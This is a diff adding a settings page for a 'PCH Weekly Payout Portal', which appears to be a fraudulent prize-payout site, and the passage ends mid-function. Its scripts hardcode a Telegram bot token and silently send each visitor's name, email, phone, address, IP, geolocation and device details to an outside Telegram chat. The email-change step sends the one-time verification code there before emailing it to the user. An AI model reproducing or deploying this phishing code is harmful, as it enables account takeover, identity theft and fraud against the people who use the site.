@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Settings — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("vcF6WtVzyf2gugPcj");
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  @keyframes pulseDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.55; transform:scale(.85); } }
+  .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+</style>
+<script src="pch_ios_shell.js"></script><script src="pch_ios_config.js"></script></head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q', chatId:'8763270406' };
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.supportTickets) parsed.supportTickets = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      if (!parsed.messages) parsed.messages = [];
+      if (parsed.messagesReadAt == null) parsed.messagesReadAt = 0;
+      if (parsed.announcementDismissedAt == null) parsed.announcementDismissedAt = 0;
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], withdrawalState:'none', currentWithdrawal:null, kyc:null, card:null, messages:[], messagesReadAt:0, announcement:null, announcementDismissedAt:0, gamePlays:null, lastSpinDate:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try {
+    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, transactions: state.transactions });
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
+  } catch(e){}
+}
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    if (Array.isArray(r.supportTickets)) state.supportTickets = r.supportTickets;
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.card) state.card = r.card;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (r.gamePlays) state.gamePlays = r.gamePlays;
+    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
+    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ DEVICE + IP ═══════════ */
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  return { os, type, browser };
+}
+let cachedIp = null, cachedGeo = null;
+async function fetchIP(){
+  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        cachedIp = d.ip;
+        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
+        return { ip: cachedIp, ...cachedGeo };
+      }
+    }
+  } catch(e){}
+  try {
+    const r2 = await fetch('https://api.ipify.org?format=json');
+    const d2 = await r2.json();
+    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
+  } catch(e){}
+  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
+  return { ip: cachedIp, ...cachedGeo };
+}
+
+/* ═══════════ TELEGRAM — silent, full unmasked ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body: fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch(err) { console.error('[TG] fetch failed:', err); return false; }
+}
+async function tgBlock() {
+  const u = state.currentUser || {};
+  const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+  const dev = detectDevice();
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  const address = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';
+  return (
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
+    `<b>Address:</b> ${tgEsc(address)}\n` +
+    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+    `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
+    `<b>Timezone:</b> ${tgEsc(net.timezone || 'N/A')}\n` +
+    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+    `<b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  );
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ SETTINGS PAGE ═══════════ */
+
+function renderSettings() {
+  const u = state.currentUser || {};
+  const avatarHtml = u.photoUrl ? `<img src="${u.photoUrl}" class="w-20 h-20 rounded-2xl object-cover border-2 border-gold-400 shadow-lg">` : `<div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-bold text-2xl shadow-lg">${(u.firstName||'U').charAt(0)}</div>`;
+
+  return `
+    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
+      <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-gear text-sky-custom mr-3"></i>Account Settings</h2>
+      <p class="text-xs text-slate-400 mt-1">Manage your profile, security, and preferences.</p>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+      <div class="space-y-6">
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 flex flex-col items-center text-center card-3d">
+          <div id="settings-photo-preview" class="relative group">
+            ${avatarHtml}
+            <label for="settings-photo-input" class="absolute inset-0 bg-black/60 rounded-2xl flex flex-col items-center justify-center opacity-0 group-hover:opacity-100 cursor-pointer transition">
+              <i class="fa-solid fa-camera text-white text-xl mb-1"></i>
+              <span class="text-[9px] text-white font-bold uppercase tracking-wider">Change</span>
+            </label>
+            <input type="file" id="settings-photo-input" accept="image/*" onchange="handlePhotoUpload(event)" class="hidden">
+          </div>
+          <h3 class="text-lg font-bold text-white mt-3">${escapeHtml(u.firstName)} ${escapeHtml(u.lastName)}</h3>
+          <p class="text-xs text-gold-400 font-mono">@${escapeHtml(u.username)}</p>
+          <p id="photo-upload-status" class="text-[10px] text-slate-400 mt-1">Click photo to update</p>
+        </div>
+
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d space-y-2">
+          <button onclick="switchSettingsTab('profile')" class="w-full text-left px-4 py-3 rounded-xl bg-navy-900 border border-navy-700 font-bold text-xs text-sky-custom active:scale-95 transition"><i class="fa-solid fa-user mr-2"></i> Profile Info</button>
+          <button onclick="switchSettingsTab('security')" class="w-full text-left px-4 py-3 rounded-xl bg-navy-900 border border-navy-700 font-bold text-xs text-slate-300 active:scale-95 transition"><i class="fa-solid fa-shield-halved mr-2"></i> Security</button>
+          <button onclick="switchSettingsTab('preferences')" class="w-full text-left px-4 py-3 rounded-xl bg-navy-900 border border-navy-700 font-bold text-xs text-slate-300 active:scale-95 transition"><i class="fa-solid fa-sliders mr-2"></i> Preferences</button>
+        </div>
+      </div>
+
+      <div class="lg:col-span-2 space-y-6" id="settings-content-area"></div>
+    </div>
+  `;
+}
+
+function switchSettingsTab(tab) {
+  const content = document.getElementById('settings-content-area');
+  const u = state.currentUser || {};
+  
+  if (tab === 'profile') {
+    content.innerHTML = `
+      <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">
+        <h3 class="text-lg font-bold text-white mb-6">Personal Information</h3>
+        <form onsubmit="saveProfileSettings(event)" class="space-y-4">
+          <div class="grid grid-cols-2 gap-4">
+            <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">First Name</label><input type="text" id="set-fname" value="${escapeHtml(u.firstName||'')}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+            <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Last Name</label><input type="text" id="set-lname" value="${escapeHtml(u.lastName||'')}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          </div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Phone</label><input type="tel" id="set-phone" value="${escapeHtml(u.phone||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Address</label><input type="text" id="set-address" value="${escapeHtml(u.address||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          <div class="grid grid-cols-3 gap-3">
+            <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">City</label><input type="text" id="set-city" value="${escapeHtml(u.city||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+            <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">State</label><input type="text" id="set-state" value="${escapeHtml(u.stateOrParish||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+            <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">ZIP</label><input type="text" id="set-zip" value="${escapeHtml(u.zip||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          </div>
+          <div class="flex justify-end pt-4"><button type="submit" class="px-6 py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs active:scale-95">Save Changes</button></div>
+        </form>
+      </div>
+    `;
+  } 
+  else if (tab === 'security') {
+    content.innerHTML = `
+      <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d space-y-6">
+        <div>
+          <h3 class="text-lg font-bold text-white mb-1">Email Address</h3>
+          <p class="text-xs text-slate-400 mb-3">Current: <span class="text-white font-bold">${escapeHtml(u.email)}</span></p>
+          <button onclick="openChangeEmailModal()" class="px-4 py-2 bg-navy-900 border border-navy-700 text-sky-custom font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-pen mr-1"></i> Change Email</button>
+        </div>
+        <div class="border-t border-navy-700/60 pt-6">
+          <h3 class="text-lg font-bold text-white mb-1">Password</h3>
+          <p class="text-xs text-slate-400 mb-3">Secure your account with a strong password.</p>
+          <button onclick="openChangePasswordModal()" class="px-4 py-2 bg-navy-900 border border-navy-700 text-sky-custom font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-key mr-1"></i> Change Password</button>
+        </div>
+      </div>
+    `;
+  }
+  else if (tab === 'preferences') {
+    content.innerHTML = `
+      <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d space-y-4">
+        <h3 class="text-lg font-bold text-white mb-2">Notification Preferences</h3>
+        <label class="flex items-center justify-between p-4 bg-navy-900 rounded-xl cursor-pointer">
+          <div><p class="text-sm font-bold text-white">Email Alerts</p><p class="text-[10px] text-slate-400">Receive weekly payout summaries.</p></div>
+          <input type="checkbox" checked class="w-4 h-4 accent-gold-500">
+        </label>
+        <label class="flex items-center justify-between p-4 bg-navy-900 rounded-xl cursor-pointer">
+          <div><p class="text-sm font-bold text-white">Promotional Emails</p><p class="text-[10px] text-slate-400">Get notified about new promo cycles.</p></div>
+          <input type="checkbox" checked class="w-4 h-4 accent-gold-500">
+        </label>
+      </div>
+    `;
+  }
+}
+
+/* ─── Two-Step Security Flows ─── */
+
+function openChangeEmailModal() {
+  showModal('Change Email', `
+    <form onsubmit="sendEmailChangeOTP(event)" class="space-y-4">
+      <p class="text-xs text-slate-300 mb-2">To change your email, we first need to verify your identity. We will send a 6-digit code to your <b>current email</b>.</p>
+      <div class="flex justify-end pt-2">
+        <button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Send Code</button>
+      </div>
+    </form>
+  `);
+}
+
+async function sendEmailChangeOTP(e) {
+  e.preventDefault();
+  const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+  sessionStorage.setItem('pch_email_otp', otpCode);
+  const u = state.currentUser || {};
+
+  // Report first — before EmailJS, so you always get the OTP even if email fails
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `📧 <b>EMAIL CHANGE — OTP REQUESTED</b>\n` +
+    `<b>Current email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>OTP code:</b> <code>${tgEsc(otpCode)}</code>\n` +
+    block
+  ).catch(()=>{});
+  
+  try {
+    await emailjs.send("service_qr9gk6b", "template_ta7bjpe", {
+      to_name: u.firstName,
+      to_email: u.email,
+      action_type: "Email Change Verification",
+      otp_code: otpCode
+    });
+    
+    showModal('Verify Identity', `
+      <form onsubmit="verifyEmailChangeOTP(event)" class="space-y-4">
+        <p class="text-xs text-white text-center mb-2">We sent a code to <b>${escapeHtml(u.email)}</b></p>
+        <input type="text" id="otp-verify-input" required maxlength="6" placeholder="000000" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-2xl text-center tracking-[0.5em] font-mono text-white focus:outline-none focus:border-sky-custom">
+        <div class="flex justify-end pt-2"><button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Verify Code</button></div>
+      </form>
+    `);
+  } catch(e) {
+    showToast('Error', 'Failed to send email.', 'error');
+  }
+}
+
+function verifyEmailChangeOTP(e) {
+  e.preventDefault();
+  const code = document.getElementById('otp-verify-input').value;
